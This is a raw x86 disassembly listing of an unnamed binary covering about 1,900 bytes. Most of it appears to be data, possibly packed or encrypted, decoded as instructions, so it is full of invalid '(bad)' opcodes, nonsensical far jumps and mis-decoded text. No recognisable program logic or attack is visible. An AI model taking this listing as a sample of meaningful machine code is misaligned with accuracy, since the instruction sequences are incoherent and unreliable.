  40b6bd:	add    BYTE PTR [edi+0x7e],bh
  40b6c0:	adc    bl,dh
  40b6c2:	add    BYTE PTR [eax],al
  40b6c4:	push   0xa01824c4
  40b6c9:	pushf  
  40b6ca:	std    
  40b6cb:	fcomi  st,st(0)
  40b6cd:	xor    ebp,esp
  40b6cf:	(bad)  
  40b6d0:	inc    ebx
  40b6d1:	jecxz  0x40b6f2
  40b6d3:	jp     0x40b734
  40b6d5:	xor    cl,dh
  40b6d7:	push   esi
  40b6d8:	and    bl,BYTE PTR [eax-0x20e8092f]
  40b6de:	dec    ebx
  40b6df:	repz lahf 
  40b6e1:	nop
  40b6e2:	div    DWORD PTR [ecx]
  40b6e4:	shr    DWORD PTR [eax-0x24],cl
  40b6e7:	add    BYTE PTR [eax],al
  40b6e9:	mov    ds:0xdf0000a1,al
  40b6ee:	adc    al,ah
  40b6f0:	add    bh,bh
  40b6f2:	cld    
  40b6f3:	xor    eax,0xdf36a665
  40b6f8:	mov    cl,0xe3
  40b6fa:	retf   0x6c95
  40b6fd:	inc    edi
  40b6fe:	or     eax,0xf484cefa
  40b703:	cmp    dh,ch
  40b705:	cs sbb ebp,edx
  40b708:	inc    esp
  40b709:	and    edi,edi
  40b70b:	(bad)  
  40b70c:	inc    DWORD PTR [ebx+0x1]
  40b70f:	ins    DWORD PTR es:[edi],dx
  40b710:	pop    ss
  40b711:	call   0xf868:0xb5c76c1
  40b718:	sub    BYTE PTR [eax],0x8a
  40b71b:	sbb    edx,DWORD PTR [edx+eax*4]
  40b71e:	pushf  
  40b71f:	shl    DWORD PTR [ebx],1
  40b721:	aam    0xdc
  40b723:	test   BYTE PTR [eax+0x4c2a1384],ch
  40b729:	jle    0x40b72a
  40b72b:	inc    DWORD PTR [ebx]
  40b72d:	cwde   
  40b72e:	xchg   ebp,eax
  40b72f:	(bad)  
  40b730:	(bad)  
  40b731:	dec    DWORD PTR [ebx-0x74747475]
  40b737:	mov    ecx,DWORD PTR [ebx+0x48b98b8b]
  40b73d:	in     al,0x8d
  40b73f:	lea    ecx,[ebp-0x72727273]
  40b745:	lea    ecx,[ebp+0x47d77474]
  40b74b:	dec    edx
  40b74c:	cdq    
  40b74d:	xor    al,0xba
  40b74f:	clc    
  40b750:	push   0x75b619c5
  40b755:	shl    BYTE PTR [ebp+0x44191fab],0xec
  40b75c:	dec    cl
  40b75e:	sbb    DWORD PTR [edi],edi
  40b760:	nop
  40b761:	je     0x40b7d7
  40b763:	mov    WORD PTR [ebx+0x74],ds
  40b766:	je     0x40b714
  40b768:	mov    al,ds:0x9fb37474
  40b76d:	inc    esi
  40b76e:	leave  
  40b76f:	pop    edi
  40b770:	jl     0x40b724
  40b772:	xlat   BYTE PTR ds:[ebx]
  40b773:	xlat   BYTE PTR ds:[ebx]
  40b774:	cmp    edi,0xae4d44da
  40b77a:	aaa    
  40b77b:	loop   0x40b7ca
  40b77d:	sbb    DWORD PTR [eax],edi
  40b77f:	jns    0x40b795
  40b781:	in     eax,0xd9
  40b783:	je     0x40b785
  40b785:	or     ebp,DWORD PTR [edx+0xa973]
  40b78b:	add    BYTE PTR [eax+0x876420c],al
  40b791:	xchg   DWORD PTR [edi+0xe9cf934],esp
  40b797:	jnp    0x40b76e
  40b799:	in     eax,dx
  40b79a:	sar    BYTE PTR [esp+edi*1+0x575d5e7],0x1d
  40b7a2:	mov    al,ds:0xc77ed762
  40b7a7:	out    dx,al
  40b7a8:	and    al,0xd
  40b7aa:	dec    ebx
  40b7ab:	sub    esi,eax
  40b7ad:	cdq    
  40b7ae:	fwait
  40b7af:	add    BYTE PTR [eax],al
  40b7b1:	adc    al,0xcc
	...
  40b7bf:	xlat   BYTE PTR ds:[ebx]
  40b7c0:	(bad)  
  40b7c1:	xor    esi,DWORD PTR es:[ebx]
  40b7c4:	xor    esi,DWORD PTR [ebx]
  40b7c6:	xor    esi,DWORD PTR [ebx]
  40b7c8:	xor    esi,DWORD PTR [ebx]
  40b7ca:	xor    eax,DWORD PTR [eax]
  40b7cc:	add    ch,al
  40b7ce:	lahf   
  40b7cf:	sub    ebx,DWORD PTR [ebx-0x29]
  40b7d2:	mov    cl,0x6d
  40b7d4:	sub    ch,BYTE PTR [esi-0x46]
  40b7d7:	xor    BYTE PTR [edi-0x70506f24],ch
  40b7dd:	jmp    0xa8c0f270
  40b7e2:	jl     0x40b839
  40b7e4:	dec    edx
  40b7e5:	add    BYTE PTR [eax],al
  40b7e7:	mov    esi,0x226d6672
  40b7ec:	arpl   WORD PTR gs:[ebp+0xd],sp
  40b7f0:	outs   dx,BYTE PTR ds:[esi]
  40b7f1:	jns    0x40b855
  40b7f3:	bound  eax,QWORD PTR gs:[ecx+0x6c]
  40b7f7:	imul   esi,DWORD PTR [edi+ebp*2+0xd],0x722e6541
  40b7ff:	or     dh,BYTE PTR [esi+0x65]
  40b802:	outs   dx,BYTE PTR ds:[esi]
  40b803:	jae    0x40b86e
  40b805:	jb     0x40b875
  40b807:	cmp    al,0xd
  40b809:	imul   edx,DWORD PTR gs:[eax+0x54],0x72
  40b80e:	ins    BYTE PTR es:[edi],dx
  40b80f:	jb     0x40b84d
  40b811:	gs jo  0x40b889
  40b814:	cs jb  0x40b885
  40b817:	jb     0x40b855
  40b819:	ins    DWORD PTR es:[edi],dx
  40b81a:	and    BYTE PTR cs:[ebp+0x72],ch
  40b81e:	imul   ebp,DWORD PTR [esi+0x3c],0x6169652e
  40b825:	das    
  40b826:	jae    0x40b84a
  40b828:	imul   esp,DWORD PTR [ebp+0x6e],0x6d657472
  40b82f:	ins    DWORD PTR es:[edi],dx
  40b830:	or     ah,BYTE PTR [ebp+0x62]
  40b833:	outs   dx,DWORD PTR ds:[esi]
  40b834:	imul   ebp,DWORD PTR fs:[esi],0x64506c65
  40b83b:	cmc    
  40b83c:	mov    dh,0x35
  40b83e:	mov    ebx,0xc10f750e
  40b843:	mov    bh,0x5
  40b845:	add    al,0xfb
  40b847:	sbb    ebx,esp
  40b849:	cli    
  40b84a:	fcom   DWORD PTR [ebx+edi*1]
  40b84d:	adc    al,0xdb
  40b84f:	movzx  edi,WORD PTR [ecx-0xf]
  40b853:	into   
  40b854:	or     al,0x0
  40b856:	add    BYTE PTR [ebp+edx*2-0x4b],al
  40b85a:	add    BYTE PTR [eax],al
  40b85c:	ss int 0xfa
  40b85f:	add    BYTE PTR [ebx+0x52c41c06],al
  40b865:	imul   esi,DWORD PTR ds:0xfd118f84,0x426e8efa
  40b86f:	(bad)  
  40b870:	mov    cl,0x13
  40b872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b873:	ror    DWORD PTR [esi+0x1c],1
  40b876:	push   edi
  40b877:	int3   
  40b878:	jb     0x40b7fd
  40b87a:	add    DWORD PTR [ebx-0x7c7c2b0e],0xffffffc9
  40b881:	jne    0x40b806
  40b883:	add    DWORD PTR [ebx-0x74747475],0xffffff8b
  40b88a:	mov    ecx,DWORD PTR [ebx-0x54777475]
  40b890:	fsub   st(2),st
  40b892:	arpl   WORD PTR [esi+0x52acf3db],cx
  40b898:	inc    ebp
  40b899:	lods   eax,DWORD PTR ds:[esi]
  40b89a:	in     al,0x7e
  40b89c:	adc    esp,esp
  40b89e:	mov    esp,0xbd6cef6d
  40b8a3:	mov    bh,0xb0
  40b8a5:	imul   edi,edi,0xffffffff
  40b8a8:	(bad)  
  40b8a9:	(bad)  
  40b8aa:	(bad)  
  40b8ab:	(bad)  
  40b8ac:	(bad)  
  40b8ad:	(bad)  
  40b8ae:	dec    DWORD PTR [ebx-0x221adc75]
  40b8b4:	jnp    0x40b841
  40b8b6:	mov    esp,DWORD PTR [ebp-0x23a474e4]
  40b8bc:	or     DWORD PTR [ebp+0x5c8d5098],ebp
  40b8c2:	adc    eax,0xf0dd80b3
  40b8c7:	nop
  40b8c8:	inc    ebx
  40b8c9:	jge    0x40b8fc
  40b8cb:	mov    ebx,cs
  40b8cd:	ds xchg ebp,eax
  40b8cf:	clc    
  40b8d0:	sbb    al,0x3c
  40b8d2:	push   ebp
  40b8d3:	mov    esi,ebx
  40b8d5:	dec    edi
  40b8d6:	jns    0x40b871
  40b8d8:	test   al,0x2
  40b8da:	mov    ecx,DWORD PTR [ebx-0x747419e8]
  40b8e0:	mov    al,ds:0xff8baaca
  40b8e5:	dec    eax
  40b8e6:	mov    edi,0xb23cda56
  40b8eb:	xchg   DWORD PTR fs:[ebx+0x442bbc3],edx
  40b8f2:	sbb    DWORD PTR [ebx],edx
  40b8f4:	push   ebp
  40b8f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8f6:	mov    esp,0x1526d6b7
  40b8fb:	test   BYTE PTR [edx+0x2dffffff],0x5d
  40b902:	sbb    edx,DWORD PTR [edx]
  40b904:	imul   eax,DWORD PTR [ebp-0x2334a3e9],0xf14bb8bc
  40b90e:	xor    esi,eax
  40b910:	(bad)  
  40b911:	es ss fpatan 
  40b915:	inc    esi
  40b916:	ror    BYTE PTR [edi+0x17],0x7a
  40b91a:	mov    edi,gs
  40b91c:	mov    dl,0xff
  40b91e:	dec    esp
  40b920:	mov    cl,0xfc
  40b922:	(bad)  
  40b923:	(bad)  
  40b924:	(bad)  
  40b925:	(bad)  
  40b926:	(bad)  
  40b927:	(bad)  
  40b928:	(bad)  
  40b929:	(bad)  
  40b92a:	(bad)  
  40b92b:	(bad)  
  40b92c:	(bad)  
  40b92d:	(bad)  
  40b92e:	jmp    0x40b8e5
  40b930:	retf   0x0
  40b933:	add    BYTE PTR [eax],al
  40b935:	add    BYTE PTR [eax],al
  40b937:	add    BYTE PTR [eax],al
  40b939:	add    BYTE PTR [ebx+0x5a8be48b],cl
  40b93f:	pusha  
  40b940:	adc    ah,BYTE PTR [ebp-0x21]
  40b943:	ss out dx,eax
  40b945:	xor    al,0x5
  40b947:	sub    eax,0xf1e08336
  40b94c:	rol    BYTE PTR [ebp+0x7eed454],cl
  40b952:	fsub   QWORD PTR [eax]
  40b954:	mov    ecx,DWORD PTR [ebx-0x74744e21]
  40b95a:	mov    ah,0x6f
  40b95c:	mov    ecx,DWORD PTR [ebx-0x5dea8bbc]
  40b962:	repz sub eax,0xd34f0290
  40b968:	push   ss
  40b969:	xchg   esp,eax
  40b96a:	inc    esi
  40b96b:	lods   eax,DWORD PTR ds:[esi]
  40b96c:	ja     0x40b8f6
  40b96e:	imul   edi,esp,0x6f
  40b971:	sub    ch,al
  40b973:	pop    ecx
  40b974:	pop    eax
  40b975:	mov    edx,0x2ebb008b
  40b97a:	addr16 pop ecx
  40b97c:	add    BYTE PTR [eax],al
  40b97e:	add    BYTE PTR [esi-0x6e68a29d],cl
  40b984:	pop    edx
  40b985:	jle    0x40b9ed
  40b987:	and    ecx,DWORD PTR [ecx-0x5e]
  40b98a:	es sahf 
  40b98c:	popf   
  40b98d:	dec    esp
  40b98e:	fisttp WORD PTR [edi+eax*4]
  40b991:	dec    edx
  40b992:	(bad)  
  40b994:	sbb    al,0xa4
  40b996:	mov    ebp,esi
  40b998:	cdq    
  40b999:	dec    eax
  40b99a:	aaa    
  40b99b:	inc    eax
  40b99c:	pop    ss
  40b99d:	mov    edx,ds
  40b99f:	imul   eax,DWORD PTR ds:0x78000028,0x5d
  40b9a9:	(bad)  
  40b9aa:	(bad)  
  40b9ab:	(bad)  
  40b9ac:	(bad)  
  40b9ad:	(bad)  
  40b9ae:	(bad)  
  40b9af:	(bad)  
  40b9b0:	(bad)  
  40b9b1:	inc    DWORD PTR [ebp+ebp*8-0x28]
	...
  40b9bd:	add    BYTE PTR [esp],ah
  40b9c0:	jl     0x40b9b4
  40b9c2:	and    eax,0x933f530e
  40b9c7:	cmp    bh,BYTE PTR [ecx+esi*8]
  40b9ca:	push   ebp
  40b9cb:	adc    al,0xe7
  40b9cd:	push   edx
  40b9ce:	gs out 0x70,al
  40b9d1:	ret    0xe54f
  40b9d4:	das    
  40b9d5:	fnstenv [ecx+0x20]
  40b9d8:	and    al,0x24
  40b9da:	and    eax,0x8703f379
  40b9df:	das    
  40b9e0:	inc    esp
  40b9e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9e2:	addr16 push es
  40b9e4:	rcr    BYTE PTR [edx+0x65],1
  40b9e7:	jb     0x40ba4f
  40b9e9:	js     0x40ba02
  40b9eb:	fbld   TBYTE PTR [edi-0x7f]
  40b9ee:	pop    ebx
  40b9ef:	or     esi,DWORD PTR [edx+0x43]
  40b9f2:	gs mov ah,0x9c
  40b9f5:	push   esp
  40b9f6:	in     al,0x24
  40b9f8:	and    al,0xaa
  40b9fa:	push   es
  40b9fb:	mov    ah,0x24
  40b9fd:	and    al,0xdf
  40b9ff:	pop    ebp
  40ba00:	out    0x24,al
  40ba02:	add    bl,ch
  40ba04:	jbe    0x40ba74
  40ba06:	dec    edi
  40ba07:	(bad)  
  40ba08:	mov    ebx,0xbefda7ee
  40ba0d:	scas   eax,DWORD PTR es:[edi]
  40ba0e:	shr    ecx,1
  40ba10:	push   0xfffffff7
  40ba12:	dec    ebp
  40ba13:	outs   dx,DWORD PTR ds:[esi]
  40ba14:	scas   eax,DWORD PTR es:[edi]
  40ba15:	cmp    cl,BYTE PTR [ebx+0x38]
  40ba18:	mov    edx,0x2f99
  40ba1d:	add    BYTE PTR [edx-0x25],bl
  40ba20:	add    BYTE PTR [eax],al
  40ba22:	in     al,dx
  40ba23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba24:	add    BYTE PTR [eax],al
  40ba26:	add    bh,bh
  40ba28:	(bad)  
  40ba29:	(bad)  
  40ba2a:	(bad)  
  40ba2b:	(bad)  
  40ba2c:	(bad)  
  40ba2d:	(bad)  
  40ba2e:	(bad)  
  40ba2f:	(bad)  
  40ba30:	fisttp DWORD PTR [eax+ebp*8-0x5d3ef401]
  40ba37:	mov    dh,0x9e
  40ba39:	retf   
  40ba3a:	push   sp
  40ba3c:	pushf  
  40ba3d:	mov    edx,0x3be62417
  40ba42:	lods   eax,DWORD PTR ds:[esi]
  40ba43:	pop    ss
  40ba44:	loopne 0x40b9c8
  40ba46:	xchg   esp,eax
  40ba47:	cwde   
	...
  40ba50:	add    BYTE PTR [eax],al
  40ba52:	add    BYTE PTR [edx],cl
  40ba54:	rol    cl,1
  40ba56:	pop    ds
  40ba57:	add    BYTE PTR [eax],al
  40ba59:	loope  0x40ba65
  40ba5b:	push   ss
  40ba5c:	mov    WORD PTR [esi+ebp*2-0x152181f4],?
  40ba63:	std    
  40ba64:	gs call 0xc4ef:0x40966ce7
  40ba6c:	sbb    ch,bh
  40ba6e:	mov    ecx,0x7b61c2f5
  40ba73:	and    al,0xe1
  40ba75:	pop    esi
  40ba76:	sbb    ebp,0x9d0d11ec
  40ba7c:	add    BYTE PTR [eax],al
  40ba7e:	lods   eax,DWORD PTR ds:[esi]
  40ba7f:	xchg   esi,eax
  40ba80:	add    BYTE PTR [eax],al
  40ba82:	int3   
  40ba83:	lods   eax,DWORD PTR ds:[esi]
  40ba84:	dec    esp
  40ba85:	add    BYTE PTR [ebp+0x5b],dh
  40ba88:	stc    
  40ba89:	sbb    cl,BYTE PTR [si+0x69]
  40ba8d:	je     0x40bae2
  40ba8f:	bound  esi,QWORD PTR gs:[eax+0x74]
  40ba93:	popa   
  40ba94:	gs fs popa 
  40ba97:	gs inc ecx
  40ba99:	jae    0x40badf
  40ba9b:	jae    0x40bb00
  40ba9d:	popa   
  40ba9e:	arpl   WORD PTR [ecx],bp
  40baa0:	ins    DWORD PTR es:[edi],dx
  40baa1:	ins    DWORD PTR es:[edi],dx
  40baa2:	ds inc ebp
  40baa4:	jb     0x40bb0b
  40baa6:	or     dl,BYTE PTR [eax+0x3c]
  40baa9:	je     0x40bb0e
  40baab:	bound  esp,QWORD PTR [eax]
  40baad:	jo     0x40badd
  40baaf:	jae    0x40baf2
  40bab1:	gs cmp eax,0x63206561
  40bab7:	and    BYTE PTR [eax+0x20],dh
  40baba:	jae    0x40baea
  40babc:	inc    esp
  40babd:	and    BYTE PTR [edx+0x28],dl
  40bac0:	arpl   WORD PTR gs:[eax+0x74],si
  40bac4:	inc    ecx
  40bac5:	and    ah,BYTE PTR [ebp+0x3a]
  40bac8:	and    BYTE PTR [eax],ah
  40baca:	and    BYTE PTR [edx+0x72],dl
  40bacd:	inc    ecx
  40bace:	cmp    al,0x20
  40bad0:	gs jo  0x40baf6
  40bad3:	inc    esp
  40bad4:	or     ah,BYTE PTR [ebp+0x66]
  40bad7:	data16 jo 0x40bb03
  40bada:	jb     0x40bb2f
  40badc:	and    BYTE PTR [eax],ah
  40bade:	gs dec ebp
  40bae0:	inc    esp
  40bae1:	outs   dx,BYTE PTR ds:[esi]
  40bae2:	outs   dx,DWORD PTR ds:[esi]
  40bae3:	and    BYTE PTR [ebp-0x4967a6ec],bh
  40bae9:	sub    al,0xa4
  40baeb:	repnz fbstp TBYTE PTR [ebx]
  40baee:	mov    DWORD PTR [eax],edi
  40baf0:	xchg   esi,eax
  40baf1:	cmp    al,0x9f
  40baf3:	test   al,0x43
  40baf5:	sar    BYTE PTR [ecx],0x75
  40baf8:	jne    0x40bb6f
  40bafa:	dec    edx
  40bafb:	add    BYTE PTR [ebp-0x17463433],bl
  40bb01:	into   
  40bb02:	inc    edx
  40bb03:	test   al,0x99
  40bb05:	jo     0x40ba8e
  40bb07:	in     al,dx
  40bb08:	div    BYTE PTR [edi-0x1e97a5]
  40bb0e:	mov    eax,DWORD PTR ss:[edi+edx*8+0x55597bd2]
  40bb16:	jmp    0xfb993090
  40bb1b:	je     0x40bb92
  40bb1d:	jne    0x40bb94
  40bb1f:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40bb25:	mov    ecx,DWORD PTR [ebx+0x5ca00a8b]
	...
  40bb33:	add    BYTE PTR [ebp+0x45],al
  40bb36:	push   esi
  40bb37:	mov    al,ds:0xcf079bc5
  40bb3c:	xchg   BYTE PTR [eax],bh
  40bb3e:	cmp    BYTE PTR [edx-0x44bad209],bh
  40bb44:	push   ds
  40bb45:	xchg   edx,eax
  40bb46:	sbb    eax,0x5a3059c
  40bb4b:	mov    ebx,0x4545cac0
  40bb50:	int    0x66
  40bb52:	inc    ebp
  40bb53:	inc    ebp
  40bb54:	and    al,0x3
  40bb56:	inc    ebp
  40bb57:	inc    ebp
  40bb58:	(bad)  
  40bb59:	nop
  40bb5a:	test   BYTE PTR ds:0xa4d488de,0xf5
  40bb61:	mov    fs,WORD PTR [esi]
  40bb63:	dec    ebp
  40bb64:	leave  
  40bb65:	mov    dl,0x81
  40bb67:	scas   eax,DWORD PTR es:[edi]
  40bb68:	jbe    0x40bbbd
  40bb6a:	push   es
  40bb6b:	and    eax,DWORD PTR [eax+0x457e795c]
  40bb71:	add    ch,bh
  40bb73:	pop    esi
  40bb74:	std    
  40bb75:	loope  0x40bb77
  40bb77:	add    BYTE PTR [eax],al
  40bb79:	sbb    ebp,DWORD PTR [esi+ebx*2+0x54]
  40bb7d:	adc    eax,0x1d818851
  40bb82:	(bad)  
  40bb84:	shl    DWORD PTR [ecx-0x14],1
  40bb87:	hlt    
  40bb88:	sub    DWORD PTR [edi+0x40],0xffffffa7
  40bb8c:	cdq    
  40bb8d:	sbb    ebx,DWORD PTR [ebx+0x40]
  40bb90:	sub    al,ch
  40bb92:	pop    edi
  40bb93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb94:	in     eax,0x62
  40bb96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb97:	xor    bh,BYTE PTR [edi-0x79]
  40bb9a:	ja     0x40bb51
  40bb9c:	add    BYTE PTR [eax],al
  40bb9e:	xor    al,0x7c
  40bba0:	add    BYTE PTR [eax],al
  40bba2:	add    BYTE PTR [ebp+0x45],al
  40bba5:	inc    ebp
  40bba6:	inc    ebp
  40bba7:	inc    ebp
  40bba8:	inc    ebp
  40bba9:	inc    ebp
  40bbaa:	inc    ebp
  40bbab:	inc    ebp
  40bbac:	ror    edi,1
  40bbae:	icebp  
	...
  40bbb7:	add    BYTE PTR [eax+0x50],dl
  40bbba:	pop    esp
  40bbbb:	or     BYTE PTR [ebx+0x2f7d2e70],bh
  40bbc1:	stc    
  40bbc2:	loop   0x40bc15
  40bbc4:	adc    eax,0x6face4fe
  40bbc9:	push   ebx
  40bbca:	mov    dl,0xdf
  40bbcd:	add    al,0x54
  40bbcf:	aas    
  40bbd0:	cmp    al,0x6b
  40bbd2:	push   eax
  40bbd3:	push   eax
  40bbd4:	fs mov dl,0xe3
  40bbd7:	inc    edi
  40bbd8:	pop    edi
  40bbd9:	jmp    0x8601:0x33531118
  40bbe0:	sbb    DWORD PTR [edi+0x62],edi
  40bbe3:	mov    ah,0xeb
  40bbe5:	jmp    0xae8f:0x35fb51cb
  40bbec:	stos   DWORD PTR es:[edi],eax
  40bbed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbee:	adc    DWORD PTR [esi-0x63afaf17],esp
  40bbf4:	iret   
  40bbf5:	lods   eax,DWORD PTR ds:[esi]
  40bbf6:	push   eax
  40bbf7:	push   eax
  40bbf8:	popf   
  40bbf9:	mov    al,ds:0xfd0c50a6
  40bbfe:	adc    edi,0xffffff94
  40bc01:	mov    es,WORD PTR [edi+0x675b81f0]
  40bc07:	je     0x40bbf1
  40bc09:	jbe    0x40bbe9
  40bc0b:	jmp    0x40bc5f
  40bc0d:	int3   
  40bc0e:	sbb    al,0x31
  40bc10:	stc    
  40bc11:	push   ebx
  40bc12:	cs ss into 
  40bc15:	or     al,0xc
  40bc17:	or     al,0x5e
  40bc19:	mov    bl,0xc
  40bc1b:	or     al,0xc9
  40bc1d:	xchg   edi,eax
  40bc1e:	or     al,0xc
  40bc20:	or     al,0x0
	...
  40bc2a:	and    DWORD PTR [eax-0x18afc760],0x29d1d6f1
  40bc34:	test   eax,0x6b264437
  40bc39:	sbb    ah,BYTE PTR [ecx]
  40bc3b:	dec    edx
  40bc3c:	xchg   ecx,eax
  40bc3d:	ja     0x40bbef
  40bc3f:	iret   
  40bc40:	jecxz  0x40bc6f
	...
  40bc4a:	add    BYTE PTR [ebp+0x4f9b538d],cl
  40bc50:	dec    edx
  40bc51:	lea    ecx,[ebp+0x31ad7d3a]
  40bc57:	idiv   BYTE PTR [esi+eax*8+0x131e2e6d]
  40bc5e:	inc    esp
  40bc5f:	(bad)  
  40bc60:	cmc    
  40bc61:	fistp  DWORD PTR [edx+0x7f]
  40bc64:	sbb    BYTE PTR [esi],dl
  40bc66:	aaa    
  40bc67:	in     eax,dx
  40bc68:	imul   ebp,DWORD PTR [ebx-0x7bfe5a1f],0xffffffea
  40bc6f:	jp     0x40bce4
  40bc71:	lock mov dh,0x34
  40bc74:	pop    ebp
  40bc75:	lea    ecx,ss:[ebp-0x727281f4]
  40bc7c:	ret    0x9d31
  40bc7f:	lea    ecx,[ebx-0x43fad6be]
  40bc85:	jae    0x40bc17
  40bc87:	jae    0x40bc6b
  40bc89:	pop    ds
  40bc8a:	mov    bh,0xe6
  40bc8c:	stc    
  40bc8d:	mov    WORD PTR [ebx],fs
  40bc8f:	out    dx,eax
  40bc90:	lods   al,BYTE PTR ds:[esi]
  40bc91:	jbe    0x40bc89
  40bc93:	and    ebx,ebp
  40bc95:	push   esi
  40bc96:	push   edx
  40bc97:	ja     0x40bcf1
  40bc99:	mov    ecx,DWORD PTR [ebx+0x2c9eda8b]
  40bc9f:	outs   dx,BYTE PTR ds:[esi]
  40bca0:	add    al,0xea
  40bca2:	sub    DWORD PTR [ebp+0x7],ebx
  40bca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bca6:	lock div DWORD PTR [ebp-0x1c3e8b33]
  40bcad:	mov    esp,0xf9bf6e6b
  40bcb2:	leave  
  40bcb3:	mov    dl,BYTE PTR [ebx+0x1e47d2b7]
  40bcb9:	mov    ecx,DWORD PTR [ebx-0x7472a279]
  40bcbf:	mov    ecx,DWORD PTR [ebx+0x0]
  40bcc5:	add    BYTE PTR [eax],al
  40bcc7:	add    BYTE PTR [eax],al
  40bcc9:	add    BYTE PTR [edi],bl
  40bccb:	sub    DWORD PTR [esi],0xffffff8d
  40bcce:	lea    ecx,[ebp-0x72727273]
  40bcd4:	lea    ecx,[ebp+0x6f5c8989]
  40bcda:	ret    0x2d08
  40bcdd:	xchg   ecx,eax
  40bcde:	sahf   
  40bcdf:	add    edx,DWORD PTR ds:0xc423cf25
  40bce5:	inc    eax
  40bce6:	sub    BYTE PTR [esi+0x23089f94],dl
  40bcec:	jae    0x40bd29
  40bcee:	std    
  40bcef:	dec    eax
  40bcf0:	mov    DWORD PTR [ecx-0x76769e7f],ecx
  40bcf6:	inc    esp
  40bcf7:	imul   ecx,DWORD PTR [ecx+0xa386d89],0xc6f3283b
  40bd01:	xor    edi,DWORD PTR [edx+0x4b9221d2]
  40bd07:	add    al,0x12
  40bd09:	sub    cl,BYTE PTR [ebp+edi*1-0x4d]
  40bd0d:	jmp    0x52047226
  40bd12:	mov    DWORD PTR [ebp-0xe],eax
  40bd15:	xor    ebx,eax
  40bd17:	jns    0x40bd5e
  40bd19:	inc    ebp
  40bd1a:	inc    ebp
  40bd1b:	aam    0x15
  40bd1d:	add    DWORD PTR [edx],edi
  40bd1f:	push   0x20
  40bd21:	inc    esp
  40bd22:	inc    ecx
  40bd23:	sbb    cl,BYTE PTR [ebx+ebp*4]
  40bd26:	inc    ebx
  40bd27:	push   cs
  40bd28:	shl    BYTE PTR [eax-0x63],cl
  40bd2b:	cmp    al,0x82
  40bd2d:	add    ecx,DWORD PTR [eax+0x795c97a5]
  40bd33:	pop    ecx
  40bd34:	push   edx
  40bd35:	lds    edx,FWORD PTR [edx]
  40bd37:	and    eax,0x21216f92
  40bd3c:	adc    BYTE PTR [ebx],dh
  40bd3e:	inc    ebp
  40bd3f:	inc    ebp
  40bd40:	loopne 0x40bdae
  40bd42:	inc    ebp
  40bd43:	inc    ebp
  40bd44:	inc    ebp
	...
  40bd4d:	add    BYTE PTR [ecx+esi*1],dh
  40bd50:	aam    0xe8
  40bd52:	call   0xe929a63f
  40bd57:	call   0x41a644
  40bd5c:	lock (bad) 
  40bd5e:	jmp    0x7f13:0xaf9d1cb3
  40bd65:	pop    ss
  40bd66:	or     dh,BYTE PTR [esi-0x73e6c164]
  40bd6c:	int3   
  40bd6d:	mov    WORD PTR [esi-0x30283a44],ds
  40bd73:	outs   dx,BYTE PTR ds:[esi]
  40bd74:	and    BYTE PTR [ebp+0x45],ch
  40bd77:	push   ebx
  40bd78:	arpl   WORD PTR [ebp+0x65],sp
  40bd7b:	gs or  eax,0x53207277
  40bd81:	je     0x40bd90
  40bd83:	outs   dx,DWORD PTR ds:[esi]
  40bd84:	outs   dx,BYTE PTR ds:[esi]
  40bd85:	inc    ecx
  40bd86:	jb     0x40bdf1
  40bd88:	or     dh,BYTE PTR [ebp+ebp*2+0x2e]
  40bd8c:	je     0x40bdfe
  40bd8e:	das    
  40bd8f:	je     0x40bdcb
  40bd91:	gs ins DWORD PTR es:[edi],dx
  40bd93:	bound  esp,QWORD PTR [eax]
  40bd95:	jb     0x40bdf9
  40bd97:	and    BYTE PTR [edi+ebp*2+0x75],ah
  40bd9b:	jae    0x40be0c
  40bd9d:	and    BYTE PTR [ecx+0xd],al
  40bda0:	ins    DWORD PTR es:[edi],dx
  40bda1:	outs   dx,DWORD PTR ds:[esi]
  40bda2:	addr16 inc ebx
  40bda4:	ins    DWORD PTR es:[edi],dx
  40bda5:	je     0x40be0c
  40bda7:	push   esi
  40bda8:	gs gs jbe 0x40be11
  40bdac:	and    BYTE PTR [esi],ch
  40bdae:	popa   
  40bdaf:	push   ebx
  40bdb0:	outs   dx,DWORD PTR ds:[esi]
  40bdb1:	outs   dx,DWORD PTR ds:[esi]
  40bdb2:	bound  ebp,QWORD PTR gs:[esi]
  40bdb5:	je     0x40be26
  40bdb7:	jb     0x40be1e
  40bdb9:	jbe    0x40be0e
  40bdbb:	cs ins DWORD PTR es:[edi],dx
  40bdbd:	fs cmp eax,0xf40a2e69
  40bdc3:	add    BYTE PTR [eax],al
  40bdc5:	mov    al,0xa0
  40bdc7:	and    bl,BYTE PTR [edi]
  40bdc9:	mov    eax,ds:0xabf2b643
  40bdce:	fs push ecx
  40bdd0:	icebp  
  40bdd1:	sar    BYTE PTR [esi+0x51],1
  40bdd4:	mov    eax,ds:0xaa3f295c
  40bdd9:	in     eax,dx
  40bdda:	or     bl,BYTE PTR ss:[ecx+0x434723a4]
  40bde1:	in     eax,dx
  40bde2:	add    BYTE PTR [eax],al
  40bde4:	add    esp,ebp
  40bde6:	in     eax,0x0
  40bde8:	add    BYTE PTR [ebp+0x43],cl
  40bdeb:	hlt    
  40bdec:	add    al,al
  40bdee:	ja     0x40bdf6
  40bdf0:	lods   eax,DWORD PTR ds:[esi]
  40bdf1:	jae    0x40bd85
  40bdf3:	lock inc esp
  40bdf5:	outs   dx,BYTE PTR ds:[esi]
  40bdf6:	adc    bh,BYTE PTR [ecx-0x3f09cf48]
  40bdfc:	in     eax,0x45
  40bdfe:	dec    eax
  40bdff:	jle    0x40be2e
  40be01:	dec    edx
  40be02:	cli    
  40be03:	ins    DWORD PTR es:[edi],dx
  40be04:	ins    DWORD PTR es:[edi],dx
  40be05:	es rol al,0xc0
  40be09:	mov    ?,esp
  40be0b:	rol    al,0xe5
  40be0e:	fld    st(0)
  40be10:	rol    al,0xff
  40be13:	(bad)  
  40be14:	(bad)  
  40be15:	(bad)  
  40be16:	(bad)  
  40be17:	(bad)  
  40be18:	(bad)  
  40be19:	(bad)  
  40be1a:	dec    DWORD PTR [ebx+0x67b205d1]
  40be20:	dec    ebp
  40be21:	ret    
